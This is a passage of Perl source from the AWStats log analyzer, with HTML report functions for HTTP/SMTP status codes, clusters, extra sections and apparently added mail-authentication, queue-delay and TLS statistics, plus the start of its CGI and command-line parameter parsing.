			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;
				push @blocklabel, "$key";
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"5\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				"$title",              "httpstatus",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td>\n</tr>\n";
		}
	}
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("HTTP Status Statistics") . "*</th>\n<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n</tr>\n";
	my $total_h = 0;
	my $count = 0;
	foreach my $key (@keylist) {
		my $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;
		print "<tr" . Tooltip( $key, $key ) . ">";
		if ( $TrapInfosForHTTPErrorCodes{$key} ) {
			print "<td><a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
				? XMLEncode(
					"$AWScript${NewLinkParams}output=errors$key")
				: "$StaticLinks.errors$key.$StaticExt"
			  )
			  . "\"$NewLinkTarget>$key</a></td>\n";
		}
		else { print "<td valign=\"top\">$key</td>\n"; }
		print "<td class=\"aws\">"
		  . ( $httpcodelib{$key} ? $httpcodelib{$key} : _t("Unknown error") )
		  . "</td>\n<td>".Format_Number($_errors_h{$key})."</td>\n<td>$p %</td>\n<td>"
		  . Format_Bytes( $_errors_k{$key} ) . "</td>\n";
		print "</tr>\n";
		$total_h += $_errors_h{$key};
		$count++;
	}
	&tab_end("* " . _t("Abnormal traffic note"));
}

#------------------------------------------------------------------------------
# Function:     Prints the Status codes chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainSMTPStatus{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowSMTPErrorsStats", 2 ); }
	print "$Center<a name=\"errors\">&nbsp;</a>";
	my $title = _t("SMTP Error codes");
	&tab_head( "$title", 19, 0, 'errors' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("SMTP Error codes") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th><th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th></tr>\n";
	my $total_h = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_errors_h, \%_errors_h );

	foreach my $key (@keylist) {
		my $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;
		print "<tr" . Tooltip( $key, $key ) . ">";
		print "<td valign=\"top\">$key</td>\n";
		print "<td class=\"aws\">"
		 . ( $smtpcodelib{$key} ? $smtpcodelib{$key} : _t("Unknown error") )
		 . "</td><td>".Format_Number($_errors_h{$key})."</td><td>$p %</td><td>"
		 . Format_Bytes( $_errors_k{$key} ) . "</td>\n";
		print "</tr>\n";
		$total_h += $_errors_h{$key};
		$count++;
	}
	&tab_end();
}
#------------------------------------------------------------------------------
# Function:    获取延迟范围
# Parameters:  延迟秒数
# Return:      范围字符串
#------------------------------------------------------------------------------
sub get_delay_range {
	my $delay = shift;
	return unless defined $delay && $delay =~ /^\d+$/;
	
	if    ($delay < 1)   { return "<1s"; }
	elsif ($delay < 5)   { return "1-5s"; }
	elsif ($delay < 10)  { return "5-10s"; }
	elsif ($delay < 30)  { return "10-30s"; }
	elsif ($delay < 60)  { return "30-60s"; }
	elsif ($delay < 300) { return "1-5min"; }
	elsif ($delay < 600) { return "5-10min"; }
	elsif ($delay < 1800) { return "10-30min"; }
	else                 { return ">30min"; }
}

#------------------------------------------------------------------------------
# Function:    解析邮件认证结果
# Parameters:  $auth_results (Authentication-Results 头内容)
# Return:      Hash reference
#------------------------------------------------------------------------------
sub parse_auth_results {
	my $auth = shift;
	return unless $auth;
	
	my %results;
	
	# 解析 DKIM
	if ($auth =~ /dkim=(\w+)/i) {
		$results{'dkim'} = lc($1);
	}
	
	# 解析 SPF
	if ($auth =~ /spf=(\w+)/i) {
		$results{'spf'} = lc($1);
	}
	
	# 解析 DMARC
	if ($auth =~ /dmarc=(\w+)/i) {
		$results{'dmarc'} = lc($1);
	}
	
	# 解析 ARC (Authenticated Received Chain)
	if ($auth =~ /arc=(\w+)/i) {
		$results{'arc'} = lc($1);
	}
	
	return \%results;
}

#------------------------------------------------------------------------------
# Function:    解析垃圾邮件评分
# Parameters:  $spam_info (X-Spam-Score 或类似字段)
# Return:      评分值
#------------------------------------------------------------------------------
sub parse_spam_score {
	my $spam_info = shift;
	return unless $spam_info;
	
	# X-Spam-Score: 5.6 (*****)
	if ($spam_info =~ /(\d+\.?\d*)/) {
		return $1;
	}
	return 0;
}

#------------------------------------------------------------------------------
# Function:    解析 TLS 信息
# Parameters:  $tls_info
# Return:      Hash reference with version and cipher
#------------------------------------------------------------------------------
sub parse_tls_info {
	my $tls_info = shift;
	return unless $tls_info;
	
	my %tls;
	
	# TLS version: TLSv1.2, TLSv1.3
	if ($tls_info =~ /TLSv(1\.\d|1\.3)/i) {
		$tls{'version'} = $1;
	}
	
	# Cipher: ECDHE-RSA-AES256-GCM-SHA384
	if ($tls_info =~ /cipher[=:]?\s*([A-Z0-9\-_]+)/i) {
		$tls{'cipher'} = $1;
	}
	
	return \%tls;
}
#------------------------------------------------------------------------------
# Function:    显示邮件认证统计图表
#------------------------------------------------------------------------------
sub HTMLShowMailAuthStats {
	if ($Debug) { debug("ShowMailAuthStats", 2); }
	
	my $total_dkim = 0;
	my $total_spf = 0;
	my $total_dmarc = 0;
	
	foreach (values %_dkim_stats) { $total_dkim += $_; }
	foreach (values %_spf_stats) { $total_spf += $_; }
	foreach (values %_dmarc_stats) { $total_dmarc += $_; }
	
	return if ($total_dkim == 0 && $total_spf == 0 && $total_dmarc == 0);
	
	print "$Center<a name=\"mailauth\">&nbsp;</a>";
	my $title = "📧 " . _t("Mail Authentication Statistics");
	&tab_head($title, 0, 0, 'mailauth');
	
	print "<tr>";
	print "<th bgcolor=\"#$color_TableBGTitle\" width=\"20%\">" . _t("Authentication") . "</th>\n";
	print "<th bgcolor=\"#$color_TableBGTitle\" width=\"16%\">" . _t("Pass") . "</th>\n";
	print "<th bgcolor=\"#$color_TableBGTitle\" width=\"16%\">" . _t("Fail") . "</th>\n";
	print "<th bgcolor=\"#$color_TableBGTitle\" width=\"16%\">" . _t("Softfail") . "</th>\n";
	print "<th bgcolor=\"#$color_TableBGTitle\" width=\"16%\">" . _t("Neutral") . "</th>\n";
	print "<th bgcolor=\"#$color_TableBGTitle\" width=\"16%\">" . _t("None") . "</th>\n";
	print "</tr>\n";
	
	# DKIM
	print "<tr>";
	print "<td class=\"aws\"><b>DKIM</b></td>\n";
	print "<td align=\"right\" bgcolor=\"#$color_success\">" . Format_Number($_dkim_stats{'pass'} || 0) . " (" . ($total_dkim ? int($_dkim_stats{'pass'}/$total_dkim*100) : 0) . "%)</td>\n";
	print "<td align=\"right\" bgcolor=\"#$color_error\">" . Format_Number($_dkim_stats{'fail'} || 0) . " (" . ($total_dkim ? int($_dkim_stats{'fail'}/$total_dkim*100) : 0) . "%)</td>\n";
	print "<td align=\"right\">" . Format_Number($_dkim_stats{'softfail'} || 0) . "</td>\n";
	print "<td align=\"right\">" . Format_Number($_dkim_stats{'neutral'} || 0) . "</td>\n";
	print "<td align=\"right\">" . Format_Number($_dkim_stats{'none'} || 0) . "</td>\n";
	print "</tr>\n";
	
	# SPF
	print "<tr>";
	print "<td class=\"aws\"><b>SPF</b></td>\n";
	print "<td align=\"right\" bgcolor=\"#$color_success\">" . Format_Number($_spf_stats{'pass'} || 0) . " (" . ($total_spf ? int($_spf_stats{'pass'}/$total_spf*100) : 0) . "%)</td>\n";
	print "<td align=\"right\" bgcolor=\"#$color_error\">" . Format_Number($_spf_stats{'fail'} || 0) . " (" . ($total_spf ? int($_spf_stats{'fail'}/$total_spf*100) : 0) . "%)</td>\n";
	print "<td align=\"right\">" . Format_Number($_spf_stats{'softfail'} || 0) . "</td>\n";
	print "<td align=\"right\">" . Format_Number($_spf_stats{'neutral'} || 0) . "</td>\n";
	print "<td align=\"right\">" . Format_Number($_spf_stats{'none'} || 0) . "</td>\n";
	print "</tr>\n";
	
	# DMARC
	print "<tr>";
	print "<td class=\"aws\"><b>DMARC</b></td>\n";
	print "<td align=\"right\" bgcolor=\"#$color_success\">" . Format_Number($_dmarc_stats{'pass'} || 0) . " (" . ($total_dmarc ? int($_dmarc_stats{'pass'}/$total_dmarc*100) : 0) . "%)</td>\n";
	print "<td align=\"right\" bgcolor=\"#$color_error\">" . Format_Number($_dmarc_stats{'fail'} || 0) . " (" . ($total_dmarc ? int($_dmarc_stats{'fail'}/$total_dmarc*100) : 0) . "%)</td>\n";
	print "<td align=\"right\">" . Format_Number($_dmarc_stats{'softfail'} || 0) . "</td>\n";
	print "<td align=\"right\">" . Format_Number($_dmarc_stats{'neutral'} || 0) . "</td>\n";
	print "<td align=\"right\">" . Format_Number($_dmarc_stats{'none'} || 0) . "</td>\n";
	print "</tr>\n";
	
	&tab_end();
	print "<br>\n";
}

#------------------------------------------------------------------------------
# Function:    显示邮件队列延迟统计
#------------------------------------------------------------------------------
sub HTMLShowMailQueueDelay {
	if ($Debug) { debug("ShowMailQueueDelay", 2); }
	
	my $total = 0;
	foreach (values %_queue_delay) { $total += $_; }
	
	return if ($total == 0);
	
	print "$Center<a name=\"queuedelay\">&nbsp;</a>";
	my $title = "⏱️ " . _t("Mail Queue Delay Statistics");
	&tab_head($title, 0, 0, 'queuedelay');
	
	print "<tr>";
	print "<th bgcolor=\"#$color_TableBGTitle\">" . _t("Delay Range") . "</th>\n";
	print "<th bgcolor=\"#$color_TableBGTitle\">" . _t("Count") . "</th>\n";
	print "<th bgcolor=\"#$color_TableBGTitle\">" . _t("Percentage") . "</th>\n";
	print "<tr>";
	
	foreach my $range (sort keys %_queue_delay) {
		my $count = $_queue_delay{$range};
		my $pct = int($count / $total * 100);
		print "<tr>";
		print "<td class=\"aws\">$range</td>\n";
		print "<td align=\"right\">" . Format_Number($count) . "</td>\n";
		print "<td align=\"right\">$pct%</td>\n";
		print "</tr>\n";
	}
	
	&tab_end();
	print "<br>\n";
}

#------------------------------------------------------------------------------
# Function:    显示 TLS 加密统计
#------------------------------------------------------------------------------
sub HTMLShowMailTLSStats {
	if ($Debug) { debug("ShowMailTLSStats", 2); }
	
	my $total_version = 0;
	foreach (values %_tls_version) { $total_version += $_; }
	
	my $total_cipher = 0;
	foreach (values %_tls_cipher) { $total_cipher += $_; }
	
	return if ($total_version == 0 && $total_cipher == 0);
	
	print "$Center<a name=\"tlsstats\">&nbsp;</a>";
	my $title = "🔒 " . _t("TLS Encryption Statistics");
	&tab_head($title, 0, 0, 'tlsstats');
	
	# TLS 版本统计
	if ($total_version > 0) {
		print "<tr><td colspan=\"2\" class=\"aws\"><b>" . _t("TLS Versions") . "</b></td>\n</tr>\n";
		foreach my $version (sort keys %_tls_version) {
			my $count = $_tls_version{$version};
			my $pct = int($count / $total_version * 100);
			print "<tr>";
			print "<td class=\"aws\">$version</td>\n";
			print "<td align=\"right\">" . Format_Number($count) . " ($pct%)</td>\n";
			print "</tr>\n";
		}
	}
	
	# TLS 加密套件统计 (只显示前10)
	if ($total_cipher > 0) {
		print "<tr><td colspan=\"2\" class=\"aws\">&nbsp;</td>\n</tr>\n";
		print "<tr><td colspan=\"2\" class=\"aws\"><b>" . _t("Top Ciphers") . "</b></td>\n</tr>\n";
		
		my $displayed = 0;
		foreach my $cipher (sort { $_tls_cipher{$b} <=> $_tls_cipher{$a} } keys %_tls_cipher) {
			last if $displayed++ >= 10;
			my $count = $_tls_cipher{$cipher};
			my $pct = int($count / $total_cipher * 100);
			print "<tr>";
			print "<td class=\"aws\">" . XMLEncode($cipher) . "</td>\n";
			print "<td align=\"right\">" . Format_Number($count) . " ($pct%)</td>\n";
			print "</tr>\n";
		}
	}
	
	&tab_end();
	print "<br>\n";
}
#------------------------------------------------------------------------------
# Function:     Prints the cluster information chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainCluster{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowClusterStats", 2 ); }
	print "$Center<a name=\"clusters\">&nbsp;</a>";
	my $title = _t("Clusters");
	
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link
		   $title 
		   .= " &nbsp; - &nbsp; <a href=\"" 
		   . (XMLEncode( "$AddLinkToExternalCGIWrapper" 
		   . "?section=CLUSTER&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
			
	&tab_head( "$title", 19, 0, 'clusters' );
	
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_cluster_p, \%_cluster_p );
	
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int( $_cluster_p{$key} / $TotalHits * 1000 ) / 10;
				push @blocklabel, "$key";
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"7\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				"$title",              "cluster",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td>\n</tr>\n";
		}
	}
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Clusters") . "</th>\n";
	&HTMLShowClusterInfo('__title__');
	if ( $ShowClusterStats =~ /P/i ) {
	print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>\n";
	}
	if ( $ShowClusterStats =~ /H/i ) {
	print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n";
	}
	if ( $ShowClusterStats =~ /B/i ) {
	print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th><th bgcolor=\"#$color_k\" width=\"80\">" . _t("Percent") . "</th>\n";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;

# Cluster feature might have been enable in middle of month so we recalculate
# total for cluster section only, to calculate ratio, instead of using global total
	foreach my $key (@keylist) {
		$total_p += int( $_cluster_p{$key} || 0 );
		$total_h += int( $_cluster_h{$key} || 0 );
		$total_k += int( $_cluster_k{$key} || 0 );
	}
	my $count = 0;
	foreach my $key (@keylist) {
		my $p_p = int( $_cluster_p{$key} / $total_p * 1000 ) / 10;
		my $p_h = int( $_cluster_h{$key} / $total_h * 1000 ) / 10;
		my $p_k = int( $_cluster_k{$key} / $total_k * 1000 ) / 10;
		print "<tr>";
		print "<td class=\"aws\">" . _t("Computer") . " $key</td>\n";
		&HTMLShowClusterInfo($key);
		if ( $ShowClusterStats =~ /P/i ) {
			print "<td>"
			  . ( $_cluster_p{$key} ? Format_Number($_cluster_p{$key}) : "&nbsp;" )
			  . "</td><td>$p_p %</td>\n";
		}
		if ( $ShowClusterStats =~ /H/i ) {
			print "<td>".Format_Number($_cluster_h{$key})."</td><td>$p_h %</td>\n";
		}
		if ( $ShowClusterStats =~ /B/i ) {
			print "<td>"
			  . Format_Bytes( $_cluster_k{$key} )
			  . "</td><td>$p_k %</td>\n";
		}
		print "</tr>\n";
		$count++;
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints a chart or table for each extra section
# Parameters:   $NewLinkParams, $NewLinkTarget, $extranum
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainExtra{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	my $extranum = shift;
	
	if ($Debug) { debug( "ExtraName$extranum", 2 ); }
	print "$Center<a name=\"extra$extranum\">&nbsp;</a>";
	my $title = $ExtraName[$extranum];
	&tab_head( "$title", 19, 0, "extra$extranum" );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th>" . $ExtraFirstColumnTitle[$extranum];
	print "&nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode(
			"$AWScript${NewLinkParams}output=allextra$extranum")
		: "$StaticLinks.allextra$extranum.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
	  
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
		print "&nbsp; - &nbsp; <a href=\""
		  . (XMLEncode(
			   "$AddLinkToExternalCGIWrapper" . "?section=EXTRA_$extranum&baseName=$DirData/$PROG"
			. "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
			. "&sectionTitle=$ExtraName[$extranum]&siteConfig=$SiteConfig" )
			. "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
  
	print "</th>\n";

	if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
		print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n";
	}
	if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
	}
	if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
		print "<th width=\"120\">" . _t("Last visit") . "</th>\n";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;

	 #$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }
	 #$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }
	my $count = 0;
	if ( $MaxNbOfExtra[$extranum] ) {
		if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
			&BuildKeyList(
				$MaxNbOfExtra[$extranum],
				$MinHitExtra[$extranum],
				\%{ '_section_' . $extranum . '_h' },
				\%{ '_section_' . $extranum . '_p' }
			);
		}
		else {
			&BuildKeyList(
				$MaxNbOfExtra[$extranum],
				$MinHitExtra[$extranum],
				\%{ '_section_' . $extranum . '_h' },
				\%{ '_section_' . $extranum . '_h' }
			);
		}
	}
	else {
		@keylist = ();
	}
	my %keysinkeylist = ();
	foreach my $key (@keylist) {
		$keysinkeylist{$key} = 1;
		my $firstcol = CleanXSS( DecodeEncodedString($key) );
		$total_p += ${ '_section_' . $extranum . '_p' }{$key};
		$total_h += ${ '_section_' . $extranum . '_h' }{$key};
		$total_k += ${ '_section_' . $extranum . '_k' }{$key};
		print "<tr>";
		printf( "<td class=\"aws\">%s</td>\n", $ExtraFirstColumnFormat[$extranum], $firstcol, $firstcol, $firstcol, $firstcol, $firstcol );
		if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
			print "<td>" . ${ '_section_' . $extranum . '_p' }{$key} . "</td>\n";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
			print "<td>" . ${ '_section_' . $extranum . '_h' }{$key} . "</td>\n";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
			print "<td>" . Format_Bytes( ${ '_section_' . $extranum . '_k' }{$key} ) . "</td>\n";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
			print "<td>" . ( ${ '_section_' . $extranum . '_l' }{$key} ? Format_Date( ${ '_section_' . $extranum . '_l' }{$key}, 1 ) : '-' ) . "</td>\n";
		}
		print "</tr>\n";
		$count++;
	}

	# If we ask average or sum, we loop on all other records
	if ( $ExtraAddAverageRow[$extranum] || $ExtraAddSumRow[$extranum] )
	{
		foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
			if ( $keysinkeylist{$_} ) { next; }
			$total_p += ${ '_section_' . $extranum . '_p' }{$_};
			$total_h += ${ '_section_' . $extranum . '_h' }{$_};
			$total_k += ${ '_section_' . $extranum . '_k' }{$_};
			$count++;
		}
	}

	# Add average row
	if ( $ExtraAddAverageRow[$extranum] ) {
		print "<tr>";
		print "<td class=\"aws\"><b>" . _t("Average") . "</b></td>\n";
		if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
			print "<td>"
			  . ( $count ? Format_Number(( $total_p / $count )) : "&nbsp;" ) . "</td>\n";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
			print "<td>"
			  . ( $count ? Format_Number(( $total_h / $count )) : "&nbsp;" ) . "</td>\n";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
			print "<td>"
			  . (
				$count ? Format_Bytes( $total_k / $count ) : "&nbsp;" )
			  . "</td>\n";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
			print "<td>&nbsp;</td>\n";
		}
		print "</tr>\n";
	}

	# Add sum row
	if ( $ExtraAddSumRow[$extranum] ) {
		print "<tr>";
		print "<td class=\"aws\"><b>" . _t("Sum") . "</b></td>\n";
		if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
			print "<td>" . Format_Number(($total_p)) . "</td>\n";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
			print "<td>" . Format_Number(($total_h)) . "</td>\n";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
			print "<td>" . Format_Bytes($total_k) . "</td>\n";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
			print "<td>&nbsp;</td>\n";
		}
		print "</tr>\n";
	}
	&tab_end();
}

return 1 if $TEST_MODE;
#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
#region MAIN
unless ($TEST_MODE) {
( $DIR  = $0 ) =~ s/([^\/\\]+)$//;
( $PROG = $1 ) =~ s/\.([^\.]*)$//;
$Extension = $1;
$DIR ||= '.';
$DIR =~ s/([^\/\\])[\\\/]+$/$1/;

$starttime = time();

# Get current time (time when AWStats was started)
( $nowsec, $nowmin, $nowhour, $nowday, $nowmonth, $nowyear, $nowwday, $nowyday )
  = localtime($starttime);
$nowweekofmonth = int( $nowday / 7 );
$nowweekofyear  =
  int( ( $nowyday - 1 + 6 - ( $nowwday == 0 ? 6 : $nowwday - 1 ) ) / 7 ) + 1;
if ( $nowweekofyear > 52 ) { $nowweekofyear = 1; }
$nowdaymod = $nowday % 7;
$nowwday++;
$nowns = Time::Local::timegm( 0, 0, 0, $nowday, $nowmonth, $nowyear );

if ( $nowdaymod <= $nowwday ) {
	if ( ( $nowwday != 7 ) || ( $nowdaymod != 0 ) ) {
		$nowweekofmonth = $nowweekofmonth + 1;
	}
}
if ( $nowdaymod > $nowwday ) { $nowweekofmonth = $nowweekofmonth + 2; }

# Change format of time variables
$nowweekofmonth = "0$nowweekofmonth";
if ( $nowweekofyear < 10 ) { $nowweekofyear = "0$nowweekofyear"; }
if ( $nowyear < 100 ) { $nowyear += 2000; }
else { $nowyear += 1900; }
$nowsmallyear = $nowyear;
$nowsmallyear =~ s/^..//;
if ( ++$nowmonth < 10 ) { $nowmonth = "0$nowmonth"; }
if ( $nowday < 10 )     { $nowday   = "0$nowday"; }
if ( $nowhour < 10 )    { $nowhour  = "0$nowhour"; }
if ( $nowmin < 10 )     { $nowmin   = "0$nowmin"; }
if ( $nowsec < 10 )     { $nowsec   = "0$nowsec"; }
$nowtime = int( $nowyear . $nowmonth . $nowday . $nowhour . $nowmin . $nowsec );

# Get tomorrow time (will be used to discard some record with corrupted date (future date))
my (
	$tomorrowsec, $tomorrowmin,   $tomorrowhour,
	$tomorrowday, $tomorrowmonth, $tomorrowyear
  )
  = localtime( $starttime + 86400 );
if ( $tomorrowyear < 100 ) { $tomorrowyear += 2000; }
else { $tomorrowyear += 1900; }
if ( ++$tomorrowmonth < 10 ) { $tomorrowmonth = "0$tomorrowmonth"; }
if ( $tomorrowday < 10 )     { $tomorrowday   = "0$tomorrowday"; }
if ( $tomorrowhour < 10 )    { $tomorrowhour  = "0$tomorrowhour"; }
if ( $tomorrowmin < 10 )     { $tomorrowmin   = "0$tomorrowmin"; }
if ( $tomorrowsec < 10 )     { $tomorrowsec   = "0$tomorrowsec"; }
$tomorrowtime =
  int(  $tomorrowyear
	  . $tomorrowmonth
	  . $tomorrowday
	  . $tomorrowhour
	  . $tomorrowmin
	  . $tomorrowsec );

# Allowed option
my @AllowedCLIArgs = (
	'migrate',            'config',
	'logfile',            'output',
	'runascli',           'update',
	'staticlinks',        'staticlinksext',
	'noloadplugin',       'loadplugin',
	'hostfilter',         'urlfilter',
	'refererpagesfilter', 'lang',
	'month',              'year',
	'framename',          'debug',
	'showsteps',          'showdropped',
	'showcorrupted',      'showunknownorigin',
	'showdirectorigin',   'limitflush',
	'nboflastupdatelookuptosave',
	'confdir',            'updatefor',
	'hostfilter',         'hostfilterex',
	'urlfilter',          'urlfilterex',
	'refererpagesfilter', 'refererpagesfilterex',
	'pluginmode',         'filterrawlog', 
	'generate-nav',		  'devices'
);

# Parse input parameters and sanitize them for security reasons
#$QueryString = '';

# AWStats use GATEWAY_INTERFACE to known if ran as CLI or CGI. AWSTATS_DEL_GATEWAY_INTERFACE can
# be set to force AWStats to be ran as CLI even from a web page.
# Run from a browser as CGI
if ( $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'} ) { $ENV{'GATEWAY_INTERFACE'} = ''; }
if ( $ENV{'GATEWAY_INTERFACE'} ) {
	$DebugMessages = 0;
	$QueryString = '';

	# Prepare QueryString
	if ( $ENV{'CONTENT_LENGTH'} ) {
		binmode STDIN;
		read( STDIN, $QueryString, $ENV{'CONTENT_LENGTH'} );
	}
	if ( $ENV{'QUERY_STRING'} ) {
		if ($QueryString) { $QueryString .= '&'; }
		$QueryString .= $ENV{'QUERY_STRING'};

		# Set & and &amp; to &amp;
		$QueryString =~ s/&amp;/&/g;
		$QueryString =~ s/&/&amp;/g;
	}

	# Remove all XSS vulnerabilities coming from AWStats parameters
	$QueryString = CleanXSS( &DecodeEncodedString($QueryString) );

	# Security test
	if ( $QueryString =~ /LogFile=([^&]+)/i ) {
		error( "Logfile parameter can't be overwritten when AWStats is used from a CGI"
		);
	}

	# No update but report by default when run from a browser
	$UpdateStats = ( $QueryString =~ /update=1/i ? 1 : 0 );

	if ( $QueryString =~ /config=([^&]+)/i ) { 
		$SiteConfig = &Sanitize("$1");
	}
	if ( $QueryString =~ /diricons=([^&]+)/i ) { $DirIcons = "$1"; }
	if ( $QueryString =~ /pluginmode=([^&]+)/i ) {
		$PluginMode = &Sanitize( "$1", 1 );
	}
	# This is to clean Remote URL
	if ( $QueryString =~ /configdir=([^&]+)/i ) {
		$DirConfig = &Sanitize("$1");
		$DirConfig =~ s/\\{2,}/\\/g;
		$DirConfig =~ s/\/{2,}/\//g;
	}

	# All filters
	if ( $QueryString =~ /hostfilter=([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	}    
	# Filter on host list can also be defined with hostfilter=filter
	if ( $QueryString =~ /hostfilterex=([^&]+)/i ) {
		$FilterEx{'host'} = "$1";
	}
	if ( $QueryString =~ /urlfilter=([^&]+)/i ) {
		$FilterIn{'url'} = "$1";
	}    
	# Filter on URL list can also be defined with urlfilter=filter
	if ( $QueryString =~ /urlfilterex=([^&]+)/i ) { $FilterEx{'url'} = "$1"; } #
	if ( $QueryString =~ /refererpagesfilter=([^&]+)/i ) {
		$FilterIn{'refererpages'} = "$1";
	} 
	# Filter on referer list can also be defined with refererpagesfilter=filter
	if ( $QueryString =~ /refererpagesfilterex=([^&]+)/i ) {
		$FilterEx{'refererpages'} = "$1";
	}
	# All output
	if ( $QueryString =~ /output=allhosts:([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	} 
	# Filter on host list can be defined with output=allhosts:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=lasthosts:([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	} 
	# Filter on host list can be defined with output=lasthosts:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=urldetail:([^&]+)/i ) {
		$FilterIn{'url'} = "$1";
	} 
	# Filter on URL list can be defined with output=urldetail:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=refererpages:([^&]+)/i ) {
		$FilterIn{'refererpages'} = "$1";
	} 
	# Filter on referer list can be defined with output=refererpages:filter to reduce number of lines read and showed

	# If migrate
	if ( $QueryString =~ /(^|-|&|&amp;)migrate=([^&]+)/i ) {
		$MigrateStats = &Sanitize("$2");

		$MigrateStats =~ /^(.*)$PROG(\d{0,2})(\d\d)(\d\d\d\d)(.*)\.txt$/;
		$SiteConfig = &Sanitize($5 ? $5 : 'xxx');
		$SiteConfig =~ s/^\.//;
	}
	# SiteConfig is used to find config file
	$SiteConfig =~ s/\.\.//g; 		
	# Avoid directory transversal
	}
	# Run from command line
	else {
		$DebugMessages = 1;

	# Prepare QueryString
	for ( 0 .. @ARGV - 1 ) {

		# If migrate
